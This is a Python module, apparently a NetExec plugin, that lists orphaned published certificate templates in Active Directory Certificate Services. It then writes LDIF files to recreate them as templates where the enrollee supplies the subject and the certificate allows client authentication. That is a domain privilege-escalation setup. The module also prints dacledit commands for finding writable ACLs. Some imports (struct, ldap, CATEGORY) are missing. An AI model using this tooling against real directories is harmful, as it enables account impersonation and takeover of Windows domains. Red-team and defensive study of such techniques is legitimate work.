from secrets import token_hex
import random

class NXCModule:
    name = "adcs_orphans"
    description = "Detect orphaned published certificate templates and optionally generate LDIF"
    supported_protocols = ["ldap"]
    category = CATEGORY.ENUMERATION
    opsec_safe = True
    multiple_hosts = False

    def options(self, context, module_options):
        """
        GENERATE_FILES     Use TRUE to write local files for LDIF. (Default: FALSE)
        """

        self.generate_files = False
        if module_options and "GENERATE_FILES" in module_options:
            self.generate_files = module_options["GENERATE_FILES"]

    def on_login(self, context, connection):
        config_dn = connection.baseDN
        ca_base = f"CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,{config_dn}"
        tpl_base = f"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{config_dn}"
        oid_base = f"CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,{config_dn}"

        published = self.get_published_templates(connection, ca_base)
        existing = self.get_existing_templates(connection, tpl_base)

        orphans = sorted(set(published) - set(existing))


        if orphans:
            context.log.highlight("Orphaned published templates:")
            for orphan_template in orphans:
                context.log.success(f"    {orphan_template}")
        else:
            context.log.fail("No orphaned published templates found.")


        if self.generate_files:
            oids={}
            base_oid = self.get_enterprise_oid_base(context, connection, oid_base)
            context.log.highlight(f"Base enterprise OID: {base_oid}")
            if not base_oid:
                context.log.fail("Could not determine enterprise OID base")
                return

            for template_name in orphans:
                a = random.randint(1000000, 9999999)
                b = random.randint(1000000, 9999999)
                hexpart = token_hex(16).upper()

                oid_cn = f"{b}.{hexpart}"
                new_oid = f"{base_oid}.{a}.{b}"

                if self.oid_exists(context, connection, oid_base, oid_cn, new_oid):
                    context.log.fail("Generated OID collided, rerun module (Weird...)")
                    return
                oids.update({template_name:new_oid})
                oid_ldif = self.build_oid_ldif(oid_cn, new_oid, oid_base, template_name)
                self.save_ldif(context,f'oid_ldif_{template_name}.ldif',oid_ldif)
            with open("pKIExpirationPeriod.bin", "wb") as f:
                f.write(struct.pack("<q", -315360000000000))

            with open("pKIOverlapPeriod.bin", "wb") as f:
                f.write(struct.pack("<q", -36288000000000))
            ## Template file registration
            for template_name in orphans:

                template_ldif = self.build_template_ldif(oids[template_name], tpl_base, template_name)
                self.save_ldif(context,f'template_ldif_{template_name}.ldif',template_ldif)

            context.log.success("Module correctly executed")

        context.log.highlight("To Check for ACLs that allow for OID creation, use:")
        context.log.display(f"impacket-dacledit -target-dn 'CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,{config_dn}' '{connection.target}/{connection.username}' -dc-ip {connection.host} #-use-ldaps")
        context.log.highlight("To Check for ACLs that allow for Template creation, use:")
        context.log.display(f"impacket-dacledit -target-dn 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{config_dn}' '{connection.target}/{connection.username}' -dc-ip {connection.host} #-use-ldaps")
    


    def build_template_ldif(self, new_oid, tpl_base, template_name):
        return (
            f"dn: CN={template_name},{tpl_base}\n"
            f"changetype: add\n"
            f"objectClass: top\n"
            f"objectClass: pKICertificateTemplate\n"
            f"cn: {template_name}\n"
            f"instanceType: 4\n"
            f"displayName: {template_name}\n"
            f"revision: 1\n"
            f"flags: 0\n"
            f"pKIDefaultKeySpec: 2\n"
            f"pKIKeyUsage: 160\n"
            f"pKIMaxIssuingDepth: -1\n"
            f"pKICriticalExtensions: 2.5.29.15\n"
            f"pKIExpirationPeriod:< file:./pKIExpirationPeriod.bin\n"
            f"pKIOverlapPeriod:< file:./pKIOverlapPeriod.bin\n"
            f"pKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.2\n"
            f"pKIDefaultCSPs: 2,Microsoft Enhanced Cryptographic Provider v1.0\n"
            f"msPKI-RA-Signature: 0\n"
            f"msPKI-Enrollment-Flag: 0\n"
            f"msPKI-Private-Key-Flag: 16\n"
            f"msPKI-Certificate-Name-Flag: 1\n"
            f"msPKI-Minimal-Key-Size: 2048\n"
            f"msPKI-Template-Schema-Version: 1\n"
            f"msPKI-Template-Minor-Revision: 1\n"
            f"msPKI-Cert-Template-OID: {new_oid}"
        )

    def get_enterprise_oid_base(self, context, connection, oid_base):
        try:
            sc = ldap.SimplePagedResultsControl()

            response = connection.ldap_connection.search(
                searchBase=oid_base,
                searchFilter="(objectClass=*)",
                attributes=["msPKI-Cert-Template-OID"],
                sizeLimit=0,
                searchControls=[sc],
            )
            for item in response:
                
                if "attributes" not in item:
                    continue
                for attr in item["attributes"]:
                    if str(attr["type"]) == "msPKI-Cert-Template-OID":
                        for val in attr["vals"]:
                            context.log.success(f"    {str(val)}")
                            return str(val)

        except Exception as e:
            context.log.fail(f"Failed to determine enterprise OID base: {e}")

    def oid_exists(self, context, connection, oid_base, oid_cn, new_oid):
        try:
            sc = ldap.SimplePagedResultsControl()

            response = connection.ldap_connection.search(
                searchBase=oid_base,
                searchFilter=f"(|(cn={oid_cn})(msPKI-Cert-Template-OID={new_oid}))",
                attributes=["cn", "msPKI-Cert-Template-OID"],
                sizeLimit=0,
                searchControls=[sc],
            )
            return len(response) > 0

        except Exception as e:
            context.log.fail(f"OID existence check failed: {e}")
            return True

    def build_oid_ldif(self, oid_cn, new_oid, oid_base, template_name):
        return (
            f"dn: CN={oid_cn},{oid_base}\n"
            f"changetype: add\n"
            f"objectClass: top\n"
            f"objectClass: msPKI-Enterprise-Oid\n"
            f"cn: {oid_cn}\n"
            f"displayName: {template_name}\n"
            f"flags: 1\n"
            f"msPKI-Cert-Template-OID: {new_oid}\n"
        )

    def save_ldif(self, context, filename, content):
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write(content)
            context.log.success(f"LDIF written to {filename}")

        except Exception as e:
            context.log.fail(f"Failed to write LDIF to {filename}: {e}")
    
    def get_published_templates(self, connection, base_dn):
        templates = []
        sc = ldap.SimplePagedResultsControl()

        response = connection.ldap_connection.search(
            searchBase=base_dn,
            searchFilter="(objectClass=pKIEnrollmentService)",
            attributes=["certificateTemplates"],
            sizeLimit=0,
            searchControls=[sc],
        )

        for item in response:
            for attr in item["attributes"]:
                if str(attr["type"]) == "certificateTemplates":
                    for val in attr["vals"]:
                        templates.append(str(val))

        return sorted(set(templates))

    def get_existing_templates(self, connection, base_dn):
        templates = []
        sc = ldap.SimplePagedResultsControl()

        response = connection.ldap_connection.search(
            searchBase=base_dn,
            searchFilter="(objectClass=pKICertificateTemplate)",
            attributes=["cn"],
            sizeLimit=0,
            searchControls=[sc],
        )

        for item in response:
            for attr in item["attributes"]:
                if str(attr["type"]) == "cn":
                    for val in attr["vals"]:
                        templates.append(str(val))

        return sorted(set(templates))
